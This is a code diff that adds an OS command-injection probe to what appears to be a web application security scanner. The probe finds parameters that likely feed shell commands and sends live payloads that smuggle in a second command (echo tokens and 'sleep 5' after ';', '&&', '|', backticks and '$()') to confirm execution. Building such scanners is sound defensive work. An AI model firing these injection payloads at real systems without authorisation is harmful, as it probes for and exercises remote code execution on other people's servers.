@@ -1929,3 +1929,109 @@ def rate_limit_probe(model, base_url: str, *, session: requests.Session | None =
                       f"brute-force throttling or account lockout."),
             target=recipe["login_path"]))
     return out
+
+
+# ── command injection ─────────────────────────────────────────────────────────
+# Param/endpoint names that commonly feed an OS command (ping/dns/host tools, etc.).
+_CMD_KW = ("cmd", "command", "exec", "run", "system", "shell", "ping", "ip", "ipaddr",
+           "host", "hostname", "addr", "address", "domain", "target", "dns", "nslookup",
+           "traceroute", "lookup")
+
+
+def _cmd_candidates(model):
+    """(endpoint, method, param, where) tuples whose name/path hints at a shell command."""
+    out = []
+    for e in getattr(model, "endpoints", []):
+        if not isinstance(e, dict):
+            continue
+        method = str(e.get("method", "GET")).upper()
+        path = str(e.get("path", ""))
+        path_hit = any(k in path.lower() for k in _CMD_KW)
+        if method == "GET":
+            for qp in (e.get("query_params") or []):
+                if path_hit or any(k in str(qp).lower() for k in _CMD_KW):
+                    out.append((e, method, qp, "query"))
+        elif method in ("POST", "PUT", "PATCH"):
+            from core.auth_recipe import field_names
+            for f in field_names(e.get("request_fields")):
+                if path_hit or any(k in str(f).lower() for k in _CMD_KW):
+                    out.append((e, method, f, "body"))
+    return out
+
+
+def command_injection_probe(model, base_url: str, *, session: requests.Session | None = None,
+                            auth: dict | None = None) -> list[ProbeFinding]:
+    """
+    OS command injection (OWASP). For params that feed a shell command, we PROVE
+    execution two ways, each with a control:
+      • output-based — inject `; echo <unique token>` (and `&&`, `|`, `$()`, backticks);
+        if the token appears in the response but NOT in the benign baseline, our command
+        ran and its output came back.
+      • time-based (fallback) — inject `; sleep 5`; if the response is ~5s slower than the
+        benign baseline, the command ran blind.
+    The unique token / timing delta is the control, so this is a proven P1, not a guess.
+    """
+    sess = session or requests.Session()
+    from core.auth_recipe import nest_body
+    base = base_url.rstrip("/")
+    out: list[ProbeFinding] = []
+    cands = _cmd_candidates(model)
+    if not cands:
+        return out
+
+    def send(e, method, param, where, value):
+        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
+        try:
+            if where == "query":
+                r = sess.get(f"{base}{path}", params={param: value}, timeout=20)
+            else:
+                r = sess.request(method, f"{base}{path}", json=nest_body({param: value}), timeout=20)
+            return r
+        except Exception:
+            return None
+
+    benign = "127.0.0.1"
+    seen: set = set()
+    for e, method, param, where in cands[:6]:
+        sig = (str(e.get("path", "")), method, param)
+        if sig in seen:
+            continue
+        seen.add(sig)
+        base_r = send(e, method, param, where, benign)
+        base_body = (base_r.text or "") if base_r is not None else ""
+        t0 = time.time()
+        base_r2 = send(e, method, param, where, benign)
+        base_time = time.time() - t0
+        if base_r2 is None:
+            continue
+
+        # 1) output-based: a unique token echoed back proves execution.
+        token = f"qaxcmd{uuid.uuid4().hex[:10]}"
+        hit = None
+        for payload in (f"{benign};echo {token}", f"{benign}&&echo {token}", f"{benign}|echo {token}",
+                        f"{benign}`echo {token}`", f"{benign}$(echo {token})"):
+            r = send(e, method, param, where, payload)
+            if r is not None and token in (r.text or "") and token not in base_body:
+                hit = ("output", payload, r.status_code)
+                break
+        # 2) time-based fallback: a sleep that slows the response proves blind execution.
+        if not hit:
+            for payload in (f"{benign};sleep 5", f"{benign}&&sleep 5", f"{benign}$(sleep 5)", f"{benign}`sleep 5`"):
+                t = time.time()
+                r = send(e, method, param, where, payload)
+                elapsed = time.time() - t
+                if r is not None and elapsed >= base_time + 4:
+                    hit = ("time", payload, r.status_code)
+                    break
+        if hit:
+            how = ("its output was reflected" if hit[0] == "output"
+                   else "the response was delayed ~5s by a sleep")
+            out.append(ProbeFinding(
+                probe="command-injection",
+                title=f"OS command injection via {where} param '{param}' on {e.get('path')}",
+                exploited=True, severity="P1",
+                evidence=(f"{method} {e.get('path')} with '{param}'='{hit[1]}' executed an injected shell "
+                          f"command ({how}; HTTP {hit[2]}). User input reaches a shell without "
+                          f"sanitisation — full remote code execution."),
+                target=str(e.get("path", ""))))
+    return out
